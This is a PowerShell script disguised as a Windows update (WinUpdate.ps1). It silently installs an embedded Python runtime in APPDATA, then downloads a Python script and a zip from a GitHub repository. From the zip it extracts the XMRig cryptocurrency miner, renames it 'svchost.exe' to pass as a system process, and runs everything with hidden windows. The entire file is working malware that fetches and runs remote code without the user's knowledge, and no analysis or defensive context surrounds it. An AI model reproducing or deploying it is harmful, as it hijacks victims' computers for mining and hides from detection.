# --- THE SELF-EVOLVING IGNITER (WinUpdate.ps1) ---
$ID = "svchost"
$Path = "$env:APPDATA\$ID"

# 1. Configuration
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/UpdateData.zip"

# 2. Preparation
if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }

# 3. Shadow Engine Setup (No-Python Fix)
if (!(Test-Path "$Path\python\pythonw.exe")) {
    $PyUrl = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip"
    Invoke-WebRequest -Uri $PyUrl -OutFile "$Path\py.zip"
    Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
    Remove-Item "$Path\py.zip"
    # Essential Libraries for Discord/Monitoring
    Start-Process -FilePath "$Path\python\python.exe" -ArgumentList "-m pip install requests psutil" -WindowStyle Hidden -Wait
}

# 4. Deployment/Sync
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
if (!(Test-Path "$Path\$ID.exe")) {
    Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdateData.zip"
    Expand-Archive -Path "$Path\UpdateData.zip" -DestinationPath $Path -Force
    $Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    if ($Miner) { Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force }
    Remove-Item "$Path\UpdateData.zip"
}

# 5. Activation
$PY_EXEC = "$Path\python\pythonw.exe"
Start-Process -FilePath $PY_EXEC -ArgumentList "`"$Path\WinServices.py`" --id $ID" -WindowStyle Hidden
